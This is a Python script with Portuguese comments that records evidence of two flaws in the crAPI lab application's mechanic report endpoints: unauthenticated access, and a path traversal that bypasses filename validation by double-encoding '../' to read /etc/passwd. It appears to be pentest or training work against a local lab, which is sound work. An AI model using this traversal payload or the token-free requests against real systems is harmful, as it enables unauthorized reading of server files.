#!/usr/bin/env python3
"""
Captura as evidências de duas falhas nos endpoints de relatório do mecânico
(serviço workshop), ambas SEM autenticação:

  11 - Acesso não autenticado: endpoints que não checam o token JWT
       (receive_report, download_report).
  12 - Path Traversal / LFI: download_report valida o nome do arquivo ANTES
       do unquote, permitindo bypass por double-encoding e leitura de arquivos
       arbitrários do servidor.

Pré-requisito: crAPI local no ar. Nenhuma autenticação é necessária (esse é o ponto).

Uso:
  BASE_URL=http://localhost:8888 python3 scripts/capturar-unauth-lfi.py

ATENÇÃO: só contra o ambiente de laboratório.
"""
import os, urllib.request, urllib.error, pathlib

BASE = os.environ.get("BASE_URL", "http://localhost:8888")
ROOT = pathlib.Path(__file__).resolve().parent.parent
EV = ROOT / "evidencias"


def get(path, read=400):
    # sem header Authorization — de proposito
    try:
        x = urllib.request.urlopen(BASE + path)
        return x.status, x.read(read).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(read).decode(errors="replace")


def main():
    # ---------------------------------------------------- 11 Unauth access
    out = []
    out.append("# Acesso nao autenticado — endpoints de relatorio do mecanico")
    out.append("# Causa: views sem o decorator @jwt_auth_required no servico workshop.")
    out.append("-" * 64)
    st, b = get("/workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&problem_details=teste&vin=0JATXVG6ESXV0HX6R")
    snippet = "HTML Server Error (500)" if "Server Error (500)" in b else b.strip()
    out.append(f"# receive_report SEM token -> HTTP {st}  {snippet}")
    out.append("#   (processa a requisicao sem exigir token; nao retorna 401 — criaria um")
    out.append("#    service request com um VIN valido)")
    st, b = get("/workshop/api/mechanic/download_report?filename=teste")
    out.append(f"# download_report SEM token -> HTTP {st}  {b.strip()}")
    out.append("#   (acessivel sem token e vaza o caminho absoluto do servidor)")
    out.append("# Contraste — endpoint que EXIGE auth, sem token:")
    st, b = get("/workshop/api/shop/products")
    out.append(f"#   GET /workshop/api/shop/products -> HTTP {st}  {b.strip()[:80]}")
    out.append("-" * 64)
    out.append("# Prova: os endpoints de relatorio respondem sem token (nenhum 401),")
    out.append("# enquanto um endpoint corretamente protegido devolve 401.")
    (EV / "11-unauth-access" / "captura.txt").write_text("\n".join(out) + "\n", encoding="utf-8")
    print("[ok] 11 Unauth access")

    # ---------------------------------------------------- 12 Path Traversal
    out = []
    out.append("# Path Traversal / LFI — download_report (SEM autenticacao)")
    out.append("# Causa: validate_filename roda ANTES do unquote; double-encoding burla a allow-list.")
    out.append("-" * 64)
    st, b = get("/workshop/api/mechanic/download_report?filename=teste")
    out.append(f"# 1) filename=teste               -> HTTP {st}  {b.strip()}  (vaza /app/reports)")
    st, b = get("/workshop/api/mechanic/download_report?filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd")
    out.append(f"# 2) ../ single-encoded           -> HTTP {st}  {b.strip()}  (gateway decodifica, validacao barra)")
    st, b = get("/workshop/api/mechanic/download_report?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd")
    out.append("# 3) ../ DOUBLE-encoded -> le /etc/passwd:")
    for ln in b.splitlines()[:6]:
        out.append("#    " + ln)
    out.append(f"#    [HTTP {st}]")
    out.append("-" * 64)
    out.append("# Prova: com double-encoding (%252e -> %2e no gateway -> '.' no unquote), a")
    out.append("# validacao e burlada e o endpoint le arquivos arbitrarios do servidor, sem token.")
    (EV / "12-path-traversal" / "captura.txt").write_text("\n".join(out) + "\n", encoding="utf-8")
    print("[ok] 12 Path Traversal / LFI")
    print("Concluído. Evidências em", EV)


if __name__ == "__main__":
    main()
